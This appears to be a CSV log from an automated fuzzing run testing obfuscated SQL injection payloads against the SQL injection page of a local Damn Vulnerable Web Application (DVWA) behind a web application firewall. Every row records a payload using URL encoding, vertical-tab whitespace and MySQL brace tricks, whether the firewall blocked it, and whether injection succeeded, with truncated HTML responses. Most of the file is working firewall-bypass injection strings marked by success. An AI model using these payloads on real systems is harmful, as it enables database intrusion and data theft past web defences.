Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=.1+or+not%0b1=%0b(not%0b{x+(select+,Bypassed,No,None,Invalid,0.025,72.79,No,500,
0'<@=1%0bor+not~false=+(!+{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0212,72.79,No,500,
0'<@=1.+or%0b!+1=%0b(not~0)%0b||,Bypassed,No,None,Invalid,0.0501,72.79,No,500,
0'<@!=.1%0bor%0b!~false=+(not%0b{a+1}=1),Bypassed,No,None,Invalid,0.0337,72.79,No,500,
0%27<@=.1+or%0btrue+like%0b{`if`+1}=1--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0394,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor%0bnot+{x+(select+1)}=1=+(!+{x,Bypassed,No,None,Invalid,0.0426,72.79,No,500,
0%27<@!=1%0bor+not%0btrue=%0b(not%0b{`if`+1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0433,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||%0b!+{x%0b(select+1)}=1=%0b(!%0b{`if`,Bypassed,Yes,Yes (unionAtk),Invalid,0.0461,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+!%0btrue=+(not%0b{x+(select%0b1)}=1,Bypassed,No,None,Invalid,0.0379,72.79,No,500,
0'<@=1.%0b||+0=+(!%0b{a+1}=1)--+,Bypassed,No,None,Invalid,0.0456,72.79,No,500,
0'<@=1.%0bor+!+1=%0b(not~false)%0b||,Bypassed,No,None,Invalid,0.0284,72.79,No,500,
0%27<@=1+or%0b!%0b{x+(select+1)}=1=+(not%0b{x,Blocked,No,None,Invalid,0.0146,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0b!+{`if`%0b1}=1=%0b(!%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0411,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot%0b{x%0b(select+1)}=1=+(!+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0491,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot%0b{x+(select%0b1)}=1=+(not%0b,Blocked,No,None,Invalid,0.0078,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+not+{x+(select+1)}=1=+(!+,Blocked,No,None,Invalid,0.0179,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+!%0b{x+(select+1)}=1=%0b(!+,Bypassed,No,None,Invalid,0.025,72.79,No,500,
0%27<@=1+||+!+{`if`+1}=1=+(!+{a+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0414,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!+{x%0b(select%0b1)}=1=+(!%0btrue,Bypassed,Yes,Yes (unionAtk),Invalid,0.0382,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0b!%0b{`if`+1}=1=+(not+{a%0b1}=1,Bypassed,No,None,Invalid,0.0466,72.79,No,500,
0'||+@<@+or+not+1=+(not+{x+,Blocked,No,None,Invalid,0.0239,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0bor%0bnot+{x%0b(select+1)}=1=+(!%0b{a,Bypassed,Yes,Yes (unionAtk),Invalid,0.0439,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+0=+(not+{x+(select+1)}=1),Blocked,No,None,Invalid,0.0194,72.82,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+||+false=+(not+{x+(select+1)}=1),Blocked,No,None,Invalid,0.0171,72.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||%0bnot%7efalse=+(not%0b{x%0b(select+1)}=1,Blocked,No,None,Invalid,0.016,72.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||%0bnot+{x+(select+1)}=1=%0b(not+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0319,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+!+{x%0b(select+1)}=1=%0b(not%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0194,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+not%0b1=+(not%0b{x%0b(select+1)}=1,Bypassed,No,None,Invalid,0.0376,72.85,No,500,
0'<@=.1+or+!%0b{x+(select%0b1)}=1=+(!%7e0,Bypassed,No,None,Invalid,0.0418,72.85,No,500,
0%27<@=1%0b||%0bnot%0b{x+(select%0b1)}=1=+(not%7e0,Bypassed,Yes,Yes (unionAtk),Invalid,0.0207,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+not%0b1=%0b(not+{a%0b1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0322,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot+{`if`+1}=1=%0b(!+1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0444,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b{a+1}=1%0blike+{`if`+1}=1%0b||',Bypassed,No,None,Invalid,0.0107,72.85,No,500,
0'<@=1.%0b||%0bfalse=%0b(not+{`if`+1}=1)%23,Bypassed,No,None,Invalid,0.0254,72.85,No,500,
0'<@=1.+or%0b!%0b{`if`+1}=1=+(not%7efalse),Bypassed,No,None,Invalid,0.0278,72.85,No,500,
0'<@=1.+or%0bnot~false=%0b(!%0b{a+1}=1),Bypassed,No,None,Invalid,0.027,72.85,No,500,
0%27<@!=1.%0bor%0b0=+(not+1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0292,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+!+{`if`+1}=1=+(!%0b{x+(select,Bypassed,No,None,Invalid,0.0311,72.85,No,500,
0%27<@=1+||+not+{`if`+1}=1=+(not+{`if`%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0276,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+not%0b{x%0b(select+1)}=1=+(!+,Bypassed,No,None,Invalid,0.0191,72.85,No,500,
0%27<@=1.+or%0bnot+1=%0b(!+{x%0b(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0282,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||%0bnot%0btrue=%0b(not%0b{a%0b1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0205,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0bnot%0b{x+(select+1)}=1=+(not%0btrue,Blocked,No,None,Invalid,0.0345,72.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(!%0b{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.026,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+not+{x+(select%0b1)}=1=+(not+,Blocked,No,None,Invalid,0.0309,72.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0b||+!%0b{x%0b(select%0b1)}=1=+(!+{x,Bypassed,No,None,Invalid,0.0468,72.85,No,500,
0'<@!=1+or%0b!%0b{a%0b1}=1=+(not+{x%0b(select,Bypassed,No,None,Invalid,0.0272,72.85,No,500,
0'<@!=.1%0b||+!+{`if`%0b1}=1=%0b(not%0b{a+1}=1,Bypassed,No,None,Invalid,0.026,72.79,No,500,
0%27<@=1.%0b||%0bnot%7efalse=+(!%0btrue)%0b||,Bypassed,Yes,Yes (unionAtk),Invalid,0.0147,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+false=+(!%0b{x%0b(select+1)}=1),Bypassed,No,None,Invalid,0.051,72.79,No,500,
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(!%0b{a,Bypassed,Yes,Yes (unionAtk),Invalid,0.0382,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+{`if`%0b1}=1+like+{`if`+1}=1+or',Bypassed,No,None,Invalid,0.0157,72.79,No,500,
0'<@=1.+||%0bnot+{x%0b(select%0b1)}=1=%0b(not%0btrue,Bypassed,No,None,Invalid,0.0247,72.79,No,500,
0%27<@!=.1%0b||%0bnot%0b{a+1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0281,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot+{`if`+1}=1=+(not+{x%0b(select,Bypassed,No,None,Invalid,0.0521,72.79,No,500,
0'<@=1+or%0bnot%0b{x+(select+1)}=1+is+false+||,Blocked,No,None,Invalid,0.0333,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or%0bnot%0b{x%0b(select+1)}=1=%0b(not+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0231,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||%0bnot+{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Invalid,0.0188,72.79,No,500,
0%27<@!=1+||%0bnot%0b{x+(select+1)}=1=+(not+,Blocked,No,None,Invalid,0.0311,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or+not+{x+(select+1)}=1=%0b(!%0b{x,Blocked,No,None,Invalid,0.0351,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||+not+{a+1}=1=+(not+{x+,Bypassed,Yes,Yes (unionAtk),Invalid,0.042,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not%0b{x+(select%0b1)}=1=+(!%0b,Bypassed,No,None,Invalid,0.0577,72.79,No,500,
0'<@=1%0bor%0b!+{x%0b(select+1)}=1=%0b(not%7efalse,Bypassed,No,None,Invalid,0.0343,72.79,No,500,
0%27<@!=1%0b||+true+like+{x+(select+1)}=1--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0149,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b!%0b{x%0b(select+1)}=1=%0b(not%0btrue,Blocked,No,None,Invalid,0.0192,72.79,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||%0b{x+(select+1)}=1+like+{`if`%0b1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0338,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot~false=%0b(!%0b{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0205,72.79,No,500,
0'<@!=.1%0b||%0bnot+{x%0b(select+1)}=1=+(not%0b{x,Bypassed,No,None,Invalid,0.0387,72.79,No,500,
0'<@!=.1+or+not+{`if`%0b1}=1=%0b(!%0b{`if`+1}=1,Bypassed,No,None,Invalid,0.0338,72.79,No,500,
0%27<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1+is+false+||,Bypassed,Yes,Yes (unionAtk),Invalid,0.0286,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b{x%0b(select+1)}=1+like+{x+(select+1)}=1+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0625,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+true=+(not+{`if`+1}=1),Bypassed,No,None,Invalid,0.0285,72.82,No,500,
0%27<@=1.%0bor+not+{a%0b1}=1=+(!%0b{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0482,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+not+{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Invalid,0.0366,72.85,No,500,
